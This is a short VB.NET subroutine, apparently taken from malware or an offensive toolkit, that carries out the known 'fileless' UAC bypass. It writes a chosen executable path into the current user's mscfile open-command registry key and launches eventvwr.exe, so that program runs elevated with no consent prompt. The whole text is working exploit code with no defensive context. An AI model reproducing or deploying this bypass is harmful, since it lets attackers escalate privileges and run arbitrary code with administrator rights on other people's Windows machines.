Public Sub Bypass_UAC(ByVal filepath As String)
	'Based: https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
	Using regkey As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Classes\mscfile\shell\open\command")
		regkey.SetValue("", filepath, RegistryValueKind.String)
	End Using
	Process.Start("eventvwr.exe")
End Sub